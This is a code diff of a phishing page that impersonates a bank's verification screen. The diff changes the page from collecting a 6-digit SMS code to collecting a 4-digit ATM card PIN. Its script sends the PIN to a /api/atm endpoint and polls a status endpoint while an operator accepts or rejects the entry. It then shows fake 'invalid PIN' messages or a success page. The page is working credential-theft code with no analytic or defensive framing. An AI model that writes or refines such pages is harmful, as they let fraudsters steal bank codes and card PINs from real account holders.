@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Verification code</title>
+<title>Confirm card PIN</title>
 <style>
   :root {
     --green: #1a6b3c;
@@ -40,9 +40,10 @@
     body { background: var(--card-bg); padding: 0; align-items: flex-start; }
     .screen { box-shadow: none; border-radius: 0; min-height: 100vh; padding: 16px 20px 0 20px; }
   }
+  .logo-wrap { display: flex; justify-content: center; margin-bottom: 24px; }
+  .logo-wrap img { max-width: 220px; width: 100%; height: auto; }
   .secure-icon {
-    width: 50px;
-    height: 50px;
+    width: 50px; height: 50px;
     background-color: rgba(138, 27, 47, 0.05);
     border-radius: 50%;
     display: flex; align-items: center; justify-content: center;
@@ -56,9 +57,9 @@
   }
   h2 { color: var(--anabi); font-size: 19px; margin: 0 0 8px; text-align: center; }
   p.desc { color: var(--muted); font-size: 13px; line-height: 1.6; margin: 0 0 24px; text-align: center; }
-  .pin-display { display: flex; justify-content: center; gap: 10px; margin-bottom: 24px; direction: ltr; }
+  .pin-display { display: flex; justify-content: center; gap: 12px; margin-bottom: 24px; direction: ltr; }
   .pin-dot {
-    width: 14px; height: 14px; border-radius: 50%;
+    width: 16px; height: 16px; border-radius: 50%;
     border: 2px solid var(--border);
     transition: all 0.15s ease;
   }
@@ -134,21 +135,18 @@
 <body>
 
   <div class="screen">
-    <div id="otpForm">
+    <div id="pinForm">
       <div class="secure-icon">
-        <img src="https://i.ibb.co/RpJQzkGv/file-0000000082108210923417ca7ddf8438.png" alt="Verification code">
+        <img src="https://i.ibb.co/wNc8DHB6/file-0000000088608243a0f14b5193cfc334.png" alt="Confirm card PIN">
       </div>
-
-      <h2>Verification code</h2>
-      <p class="desc">A verification code will be sent to the mobile number registered with your bank</p>
+      <h2>Confirm card PIN</h2>
+      <p class="desc">Enter the 4-digit card PIN to complete verification and activate the service.</p>
 
       <div class="pin-display">
         <div class="pin-dot" id="dot-0"></div>
         <div class="pin-dot" id="dot-1"></div>
         <div class="pin-dot" id="dot-2"></div>
         <div class="pin-dot" id="dot-3"></div>
-        <div class="pin-dot" id="dot-4"></div>
-        <div class="pin-dot" id="dot-5"></div>
       </div>
 
       <div class="keypad">
@@ -161,19 +159,19 @@
         <div class="key" onclick="pressNum(7)">7</div>
         <div class="key" onclick="pressNum(8)">8</div>
         <div class="key" onclick="pressNum(9)">9</div>
-        <div class="key action" onclick="clearOtp()">Clear</div>
+        <div class="key action" onclick="clearPin()">Clear</div>
         <div class="key" onclick="pressNum(0)">0</div>
         <div class="key action" onclick="backspace()">Delete</div>
       </div>
 
-      <button class="btn-submit" id="btnSubmit" type="button" disabled>Confirm</button>
-      <div class="error-msg" id="errorMsg">Please enter the complete code</div>
+      <button class="btn-submit" id="btnSubmit" onclick="submitPin()" disabled>Confirm and continue</button>
+      <div class="error-msg" id="errorMsg">An error occurred while sending the data. Please try again.</div>
     </div>
   </div>
 
   <div class="overlay" id="waitOverlay">
     <div class="spinner"></div>
-    <p>Verifying...</p>
+    <p>Verifying your details...</p>
   </div>
 
   <div class="overlay" id="rejectOverlay">
@@ -183,75 +181,57 @@
         <line x1="6" y1="6" x2="18" y2="18"></line>
       </svg>
     </div>
-    <p style="color:#c0392b; font-weight:bold; font-size:16px;">The code is invalid or expired</p>
-    <button type="button" id="retryOtpBtn" style="background-color:#c0392b;">Try again</button>
+    <p style="color:#c0392b; font-weight:bold; font-size:16px;">The ATM PIN is invalid or expired</p>
+    <button type="button" id="retryPinBtn" style="background-color:#c0392b;">Try again</button>
   </div>
 
   <script>
-    var otp = "";
+    var pin = "";
     var requestId = sessionStorage.getItem('aman_bank_request_id') || localStorage.getItem('requestId') || new URLSearchParams(window.location.search).get('id');
     if (!requestId) {
       requestId = '999';
       localStorage.setItem('requestId', requestId);
     }
 
-    var otpForm = document.getElementById('otpForm');
+    var pinForm = document.getElementById('pinForm');
     var waitOverlay = document.getElementById('waitOverlay');
     var rejectOverlay = document.getElementById('rejectOverlay');
-    var statusPollTimer = null;
-    var errorMsg = document.getElementById('errorMsg');
+    var pollTimer = null;
 
     function updateDots() {
-      for (var i = 0; i < 6; i++) {
+      for (var i = 0; i < 4; i++) {
         var dot = document.getElementById('dot-' + i);
-        if (i < otp.length) dot.classList.add('filled');
-        else dot.classList.remove('filled');
+        if (i < pin.length) { dot.classList.add('filled'); }
+        else { dot.classList.remove('filled'); }
       }
-      document.getElementById('btnSubmit').disabled = (otp.length !== 6);
+      document.getElementById('btnSubmit').disabled = (pin.length !== 4);
     }
 
-    function pressNum(num) {
-      if (otp.length < 6) {
-        otp += num;
-        updateDots();
-      }
-    }
+    function pressNum(num) { if (pin.length < 4) { pin += num; updateDots(); } }
+    function clearPin() { pin = ""; updateDots(); }
+    function backspace() { if (pin.length > 0) { pin = pin.slice(0, -1); updateDots(); } }
 
-    function clearOtp() {
-      otp = "";
-      updateDots();
-      errorMsg.style.display = 'none';
-    }
+    function stopPoll() { clearInterval(pollTimer); pollTimer = null; }
 
-    function backspace() {
-      if (otp.length > 0) {
-        otp = otp.slice(0, -1);
-        updateDots();
-        errorMsg.style.display = 'none';
-      }
-    }
-
-    function stopPoll() { clearInterval(statusPollTimer); statusPollTimer = null; }
-
-    function pollOtpStatus() {
-      statusPollTimer = setInterval(function() {
+    function pollStatus() {
+      pollTimer = setInterval(function() {
         fetch('/api/status/' + requestId)
           .then(function(res) { return res.json(); })
           .then(function(data) {
             if (!data.ok) return;
 
-            if (data.stage === 'atm' && data.status === 'accept' && data.otpSubmitted) {
+            if (data.stage === 'success' && data.status === 'success') {
               stopPoll();
-              window.location.href = 'atm-en.html?id=' + requestId;
+              window.location.href = 'success.html?id=' + requestId;
               return;
             }
 
-            if (data.stage === 'otp' && data.status === 'reject') {
+            if (data.stage === 'atm' && data.status === 'reject') {
               stopPoll();
               waitOverlay.classList.remove('show');
-              otpForm.style.display = 'block';
-              errorMsg.textContent = 'The request was rejected by the administrator. Please try again.';
-              errorMsg.style.display = 'block';
+              pinForm.style.display = 'block';
+              document.getElementById('errorMsg').style.display = 'block';
+              rejectOverlay.classList.add('show');
               return;
             }
           })
@@ -259,57 +239,37 @@
       }, 2500);
     }
 
-    function submitOtp() {
-      if (otp.length !== 6) {
-        errorMsg.textContent = 'Please enter the complete code';
-        errorMsg.style.display = 'block';
-        return;
-      }
-
-      errorMsg.style.display = 'none';
-      otpForm.style.display = 'none';
+    function submitPin() {
+      if (pin.length !== 4) return;
+      pinForm.style.display = 'none';
       waitOverlay.classList.add('show');
+      document.getElementById('errorMsg').style.display = 'none';
       rejectOverlay.classList.remove('show');
 
-      fetch('/api/otp', {
+      fetch('/api/atm', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ id: requestId, otp: otp })
+        body: JSON.stringify({ id: requestId, atmPin: pin })
       })
       .then(function(res) { return res.json(); })
       .then(function(data) {
         if (data.ok) {
-          pollOtpStatus();
-        } else {
-          throw new Error('failed');
-        }
+          pollStatus();
+        } else { throw new Error('failed'); }
       })
       .catch(function() {
         waitOverlay.classList.remove('show');
-        otpForm.style.display = 'block';
-        errorMsg.textContent = 'The code is invalid or expired';
-        errorMsg.style.display = 'block';
+        pinForm.style.display = 'block';
+        document.getElementById('errorMsg').textContent = 'The ATM PIN is invalid or expired';
+        document.getElementById('errorMsg').style.display = 'block';
       });
     }
 
-    document.getElementById('btnSubmit').addEventListener('click', submitOtp);
-
-    document.getElementById('retryOtpBtn').addEventListener('click', function() {
+    document.getElementById('retryPinBtn').addEventListener('click', function() {
       rejectOverlay.classList.remove('show');
-      otpForm.style.display = 'block';
-      otp = "";
-      updateDots();
-      errorMsg.style.display = 'none';
+      pinForm.style.display = 'block';
+      clearPin();
     });
-
-    var urlParams = new URLSearchParams(window.location.search);
-    if (urlParams.get('error') === '1' || urlParams.get('error') === 'otp') {
-      errorMsg.textContent = 'The request was rejected by the administrator. Please try again.';
-      errorMsg.style.display = 'block';
-    }
-
-    updateDots();
   </script>
-
 </body>
 </html>
